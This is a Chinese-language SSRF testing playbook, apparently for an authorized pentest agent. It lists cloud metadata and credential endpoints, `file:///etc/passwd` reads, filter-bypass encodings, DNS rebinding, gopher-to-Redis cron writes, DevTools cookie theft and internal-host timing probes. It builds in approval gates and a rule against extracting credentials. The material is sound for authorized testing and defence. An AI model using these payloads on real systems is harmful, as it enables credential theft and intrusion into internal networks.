---
id: ssrf-deep
title: SSRF 手册（协议/云元数据/绕过/内网探活）
tags: ssrf,gopher,元数据,rebinding,s4
---
# SSRF 手册

> 前置：oob-interactsh。判据=回连源 IP 证明「服务器侧发起请求」；**云元数据只读存在性证明（取部分字段证明可达），凭据不落地不外传**。

## 一、探测链

```bash
# ① 带外确证（第一判据）：url=http://<oob回连>/ssrf
# ② 内网探活（受限、限速）：url=http://10.x.x.x:port 状态/时间差异分端口批次
# ③ 云元数据（按云族）：
http://100.100.100.200/latest/meta-data/        # 阿里云 ECS
http://169.254.169.254/latest/meta-data/        # AWS/华为云/通用
http://metadata.google.internal/                # GCP（需头 Metadata-Flavor）
# ④ 元数据→临时凭据链：确证可达后，凭据获取与利用转 S5 审批（cloud-security 联动）
```

## 二、入口形态（injection-points 六入口都要过）

- 显式 url/export/proxy 参数；头像/富文本/导入的 URL 字段；PDF/HTML 渲染；webhook 配置；SSO/OAuth 回调指定；文件路径参数被当 URL 处理。

## 三、协议与绕过（检测口径）

| 防护特征 | 等价探针 |
|---|---|
| 黑名单 169.254 | 十进制 IP `2852039166`、八进制、IPv6 `[::ffff:a9fe:a9fe]`、DNS rebinding（自建 A 记录双解析） |
| 协议白名单 http | `gopher://`（redis/mysql 内网打点→转 S5）、`dict://`（redis 探测判据）、`file:///etc/passwd` |
| 校验域名后拼 URL | `http://信任域@<回连>`、`http://信任域.<可控域>`、`\@` 截断变体 |
| 302 跳转过滤 | 自建跳转器（回连服务 302 → 元数据）；内网 302 目标 |
| 域名白名单 | DNS rebinding（TTL=0 双解析）；子域接管条件 |

## 四、影响分级与登记

1. 出网确证（回连）→ record_finding（cwe-918）。
2. 内网可达性 → 探活矩阵登记（端口×主机，限速 ≤1 req/s）。
3. 元数据可达 → 存在性证明 + S5 审批链路（临时凭据获取属高危）。
4. gopher→内网服务写操作 → 一律 S5，禁止 s4 直接打。

## 冷门元数据/协议深潜/时间侧信道

- **冷门元数据端点**：AWS ECS `169.254.170.2/v2/credentials`；GCP `metadata.google.internal/computeMetadata/v1beta1/`（无需 Metadata-Flavor 头）；IPv6 `[fd00:ec2::254]`；阿里云 `100.100.100.200/latest/meta-data/ram/security-credentials/`
- **IMDSv2 绕过判据**：SSRF 支持自定义请求头即可 PUT token 获取会话
- **解析变体**：`0.0.0.0` 解析为 localhost；CNAME 链最终指向 localhost
- **headless 浏览器接管**：CDP `127.0.0.1:9222/json` → WebSocket 接管 → 读 cookie/DOM
- **链式**：WebLogic CVE-2014-4210 `uddiexplorer/SearchPublicRegistries.jsp?operator=` + CRLF 打 Redis 写 cron；K8s CVE-2020-8554/8562 绕过判据（校验时外部 IP、请求时内部 IP）；DNS rebinding（TTL=0、rbndr.us 双解析）；Gopherus 四服务（mysql/fastcgi/redis/smtp）
- **时间侧信道判内网存活**（无回显 SSRF）：资源 URL 参数（avatar 型）→ `http://x.dnslog.cn/#` 注释原后缀确认出网 → 依次替换 127.0.0.1/内网段 → **响应时长差分（v5.6.1 修订：目标级动态基线，禁用固定分档）**——先对目标测噪声基线：连发 5 次已知外网 URL 取中位时长 T_ext、5 次必然超时地址取中位 T_to；判定=候选地址时长 ≥ max(3×T_ext, T_to÷3) 且**连续 3 轮稳定复现**（排除网络抖动）→ 才画内网存活判定表；单次时长偏离只记 candidate
### 实战补遗（v4.4 一线 SRC 实战实证，已去标识）

- **第一排查位**："保存头像"/avatar 类资源 URL 参数是无回显 SSRF 最高频入口——上传/保存动作全部抓包核对 URL 参数是否服务端发起请求。
- **出网确认细节**：dnslog 域名后用 `#` 注释掉原 URL 的剩余部分（`http://x.dnslog.cn/#原地址`），既确认出网又保留参数合法性。
- **时长三分档基线**（实测数字可直接写进覆盖登记判据）：外网资源 0.3s / loopback 1.1s / 内网不通 6s+；偏离基线 ≥3× = 该地址被服务端请求过 → 内网存活判定表（本技能"时间侧信道"节的实操来源，两处判据一致）。
